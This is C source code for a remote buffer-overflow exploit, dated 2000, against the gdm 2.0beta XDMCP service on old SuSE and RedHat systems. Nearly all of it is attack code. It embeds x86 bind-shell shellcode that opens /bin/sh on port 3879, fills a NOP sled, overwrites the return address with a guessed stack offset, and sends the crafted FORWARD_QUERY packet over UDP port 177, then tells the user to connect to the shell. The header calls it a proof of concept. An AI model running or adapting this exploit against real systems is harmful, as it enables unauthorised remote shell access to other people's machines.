/*
 *             gdm (xdmcp) exploit
 *         written 05/2000 by AbraxaS
 *
 *     abraxas@sekure.de && www.sekure.de
 *
 *
 * Tested on:  SuSE 6.2 / gdm-2.0beta1-4,
 *           RedHat 6.2 / gdm-2.0beta2
 *
 * Offsets: Worked with offsets between 0 and 300
 *
 * Usage: gdmexpl [target] [offset]
 *
 * Note: Just a proof of concept.
 *
 * Greetings to: dies, grue, lamagra & (silly) peak
 */


#include <stdio.h>
#include <strings.h>
#include <unistd.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netdb.h>

#define NOP 0x90

/* lammys bind shell code / binds a shell to port 3879 */
char code[]=
"\x89\xe5\x31\xd2\xb2\x66\x89\xd0\x31\xc9\x89\xcb\x43\x89\x5d\xf8"
"\x43\x89\x5d\xf4\x4b\x89\x4d\xfc\x8d\x4d\xf4\xcd\x80\x31\xc9\x89"
"\x45\xf4\x43\x66\x89\x5d\xec\x66\xc7\x45\xee\x0f\x27\x89\x4d\xf0"
"\x8d\x45\xec\x89\x45\xf8\xc6\x45\xfc\x10\x89\xd0\x8d\x4d\xf4\xcd"
"\x80\x89\xd0\x43\x43\xcd\x80\x89\xd0\x43\xcd\x80\x89\xc3\x31\xc9"
"\xb2\x3f\x89\xd0\xcd\x80\x89\xd0\x41\xcd\x80\xeb\x18\x5e\x89\x75"
"\x08\x31\xc0\x88\x46\x07\x89\x45\x0c\xb0\x0b\x89\xf3\x8d\x4d\x08"
"\x8d\x55\x0c\xcd\x80\xe8\xe3\xff\xff\xff/bin/sh";


int resolve (char *denise)
{
  struct hostent *info;
  unsigned long ip;

  if ((ip=inet_addr(denise))==-1)
  {
    if ((info=gethostbyname(denise))==0)
    {
      printf("Couldn't resolve [%s]\n", denise);
      exit(0);
    }
    memcpy(&ip, (info->h_addr), 4);
  }
  return (ip);
}


int main (int argc, char **argv)
{
  char uhm;
  int nadine;
  short blah[6];
  char buffy[1400]; /* you might make this buffer bigger to increase the
                       probability to hit the right addy. making the
                       buffer too big could destroy the code though */
  unsigned long addy;
  struct sockaddr_in stephanie;
  char big_buffy[sizeof(buffy)+12];

  if (argc < 3)
  {
    printf("\nGDM 2.0betaX exploit by AbraxaS (abraxas@sekure.de)"
           "\nUsage: %s [target] [offset]\n", argv[0]);
    exit(0);
  }

  addy = 0xbffff8c0-atoi(argv[2]);

  stephanie.sin_family = AF_INET;
  stephanie.sin_port = htons (177);
  stephanie.sin_addr.s_addr = resolve(argv[1]);
  nadine = socket (AF_INET, SOCK_DGRAM, 0);

  if (connect(nadine,(struct sockaddr *)&stephanie,sizeof(struct
sockaddr))<0)
  {
    perror("Connect"); exit(0);
  }

  /* filling buffer.buffy with NOPs */
  memset(buffy, NOP, sizeof(buffy));
  /* cleaning buffer.big_buffy */
  bzero(big_buffy, sizeof(big_buffy));

  /*
   *   creating XDMCP header
   */

  /* XDM_PROTOCOL_VERSION */
  blah[0] = htons(1);
  /* opcode "FORWARD_QUERY" */
  blah[1] = htons(4);
  /* length (checksum)*/
  blah[2] = htons(5+sizeof(buffy)); /* see checksum algorithm */
  /* length of display buffer */
  blah[3] = htons(sizeof(buffy));
  /* display port */
  blah[4] = htons(0);
  /* authlist */
  blah[5] = htons(0);

  *(short *)&big_buffy[0]=blah[0];
  *(short *)&big_buffy[2]=blah[1];
  *(short *)&big_buffy[4]=blah[2];
  *(short *)&big_buffy[6]=blah[3];
  *(short *)&big_buffy[sizeof(buffy)+8]=blah[4];
  *(short *)&big_buffy[sizeof(buffy)+10]=blah[5];


  /* writing shellcode */
  memcpy(buffy+sizeof(buffy)-strlen(code), code, strlen(code));

  /* fixing some stuff */
  *(long *)&buffy[0] = 0x0100007f; /* source address, not neccessary */
  *(long *)&buffy[4] = 0x00000000; /* cleaning clnt_authlist */
  *(long *)&buffy[8] = 0x00000000;

  /* writing own RET address */
  *(long *)&buffy[32]=addy;

  /* copying buffy into big_buffy */
  memcpy(big_buffy+8, buffy, sizeof(buffy));

  /* sending big_buffy */
  write(nadine, big_buffy, sizeof(big_buffy));

  printf("\nConnect to %s, port 3879 now.", argv[1]);
  printf("\nBut behave :) --abraxas\n");

  close(nadine);

}

